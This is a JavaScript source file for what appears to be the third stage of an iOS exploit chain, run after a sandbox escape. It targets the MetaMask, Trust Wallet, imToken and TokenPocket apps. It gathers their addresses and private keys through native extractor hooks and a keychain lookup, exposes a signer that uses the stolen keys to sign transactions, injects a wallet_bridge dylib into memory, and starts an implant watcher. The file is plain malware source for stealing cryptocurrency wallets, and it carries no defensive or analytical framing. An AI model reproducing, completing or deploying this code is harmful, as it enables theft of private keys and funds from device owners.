/**
 * Stage3 post-escape wallet bridge installer.
 * Populates window.__WALLET_STORE and window.__nativeSignTx for wallet_bridge.js.
 *
 * Native bootstrap (_process) may pre-fill:
 *   window.__STAGE3_WALLET_JSON  — object or JSON string
 *   window.__STAGE3_EXTRACT_WALLETS() — sync extractor returning store map
 *   window.__STAGE3_NATIVE_SIGN(chain, payload, privateKeyHex) — native signer
 */
(function (global) {
    'use strict';

    var TARGET_WALLET_APPS = [
        { id: 'metamask', label: 'MetaMask', bundle: 'io.metamask.MetaMask', servicePrefix: 'MetaMask' },
        { id: 'trust', label: 'Trust Wallet', bundle: 'com.sixdays.trust', servicePrefix: 'Trust' },
        { id: 'imtoken', label: 'imToken', bundle: 'im.token.app', servicePrefix: 'imToken' },
        { id: 'tokenpocket', label: 'TokenPocket', bundle: 'com.tokenpocket.pro', servicePrefix: 'TokenPocket' },
    ];

    function log(msg) {
        if (typeof global.log === 'function') global.log(msg);
        else if (typeof global.console !== 'undefined') global.console.log(msg);
    }

    function normalizeHex(hex) {
        hex = String(hex || '').replace(/^0x/i, '');
        return hex.length % 2 === 0 ? hex : '0' + hex;
    }

    function mergeStore(base, extra) {
        var out = Object.assign({}, base || {});
        if (!extra || typeof extra !== 'object') return out;
        Object.keys(extra).forEach(function (chain) {
            var item = extra[chain];
            if (!item || typeof item !== 'object') return;
            if (!item.address && !item.privateKey) return;
            out[chain] = Object.assign({}, out[chain] || {}, item);
        });
        return out;
    }

    function readStagingJson() {
        if (!global.__STAGE3_WALLET_JSON) return null;
        try {
            return typeof global.__STAGE3_WALLET_JSON === 'string'
                ? JSON.parse(global.__STAGE3_WALLET_JSON)
                : global.__STAGE3_WALLET_JSON;
        } catch (e) {
            log('[Stage3] Invalid __STAGE3_WALLET_JSON: ' + e);
            return null;
        }
    }

    function callNativeExtract() {
        if (typeof global.__STAGE3_EXTRACT_WALLETS !== 'function') return null;
        try {
            return global.__STAGE3_EXTRACT_WALLETS(TARGET_WALLET_APPS);
        } catch (e) {
            log('[Stage3] __STAGE3_EXTRACT_WALLETS failed: ' + e);
            return null;
        }
    }

    function tryCallerKeychainExtract(platformModule, utilityModule) {
        var state = platformModule && platformModule.platformState;
        var caller = state && state.caller;
        var cr = typeof platformModule.cr === 'function' ? platformModule.cr() : null;
        if (!caller || !cr || typeof cr.dlsym !== 'function') return null;

        try {
            var secItem = cr.dlsym('SecItemCopyMatching');
            if (!secItem) return null;
            // Native keychain walk requires ObjC/CFCreation helpers inside bootstrap.
            // When bootstrap adds __STAGE3_EXTRACT_WALLETS it should call SecItemCopyMatching internally.
            log('[Stage3] SecItemCopyMatching resolved — waiting for native extractor hook');
        } catch (e) {
            log('[Stage3] Keychain resolver unavailable: ' + (e && e.message ? e.message : e));
        }
        return null;
    }

    function buildNativeSigner(platformModule, utilityModule) {
        return function nativeSignTx(chain, payload, privateKeyHex) {
            if (typeof global.__STAGE3_NATIVE_SIGN === 'function') {
                try {
                    return global.__STAGE3_NATIVE_SIGN(chain, payload, normalizeHex(privateKeyHex));
                } catch (e) {
                    log('[Stage3] __STAGE3_NATIVE_SIGN error: ' + (e && e.message ? e.message : e));
                    return null;
                }
            }

            var state = platformModule && platformModule.platformState;
            var caller = state && state.caller;
            if (!caller || typeof caller.jd !== 'function') {
                log('[Stage3] __nativeSignTx unavailable — no native signer for ' + chain);
                return null;
            }

            // Placeholder until bootstrap wires chain-specific sign helpers.
            log('[Stage3] __nativeSignTx stub (chain=' + chain + ') — integrate __STAGE3_NATIVE_SIGN in bootstrap');
            return null;
        };
    }

    function notifyReady(store) {
        try {
            global.dispatchEvent(new CustomEvent('stage3-wallets-ready', {
                detail: {
                    chains: Object.keys(store || {}),
                    count: Object.keys(store || {}).length,
                },
            }));
        } catch (e) {}
    }

    function installStage3WalletBridge(escapeResult, platformModule, utilityModule) {
        if (escapeResult !== 0) {
            log('[Stage3] Wallet bridge skipped — escape result=' + escapeResult);
            return global.__WALLET_STORE || {};
        }

        if (typeof global.registerStage3WalletHooks === 'function') {
            global.registerStage3WalletHooks(platformModule, utilityModule);
        }

        var store = mergeStore(global.__WALLET_STORE, readStagingJson());
        store = mergeStore(store, callNativeExtract());
        store = mergeStore(store, tryCallerKeychainExtract(platformModule, utilityModule));
        if (typeof global.extractWalletsViaKeychain === 'function') {
            try {
                var scan = global.extractWalletsViaKeychain(platformModule, utilityModule, TARGET_WALLET_APPS);
                store = mergeStore(store, scan && scan.store);
            } catch (e) {
                log('[Stage3] extractWalletsViaKeychain failed: ' + e);
            }
        }

        global.__WALLET_STORE = store;
        global.__nativeSignTx = buildNativeSigner(platformModule, utilityModule);
        global.__STAGE3_TARGET_WALLET_APPS = TARGET_WALLET_APPS.slice();

        if (typeof global.loadWalletBridgeDylib === 'function') {
            try {
                var dylibResult = global.loadWalletBridgeDylib(platformModule, utilityModule);
                if (dylibResult && dylibResult.ok) {
                    log('[Stage3] wallet_bridge.dylib injected at 0x' + (dylibResult.base || 0).toString(16));
                } else {
                    log('[Stage3] wallet_bridge memory inject skipped: ' +
                        (dylibResult && dylibResult.reason ? dylibResult.reason : 'unavailable'));
                }
            } catch (e) {
                log('[Stage3] loadWalletBridgeDylib failed: ' + e);
            }
        }

        if (global.ImplantOps && global.ImplantOps.startWalletOpenWatcher) {
            global.ImplantOps.startWalletOpenWatcher();
        }

        var chainCount = Object.keys(store).filter(function (k) {
            return store[k] && store[k].address;
        }).length;

        log('[Stage3] Wallet bridge installed — chains with address: ' + chainCount);
        notifyReady(store);
        return store;
    }

    global.installStage3WalletBridge = installStage3WalletBridge;
})(typeof globalThis !== 'undefined' ? globalThis : window);
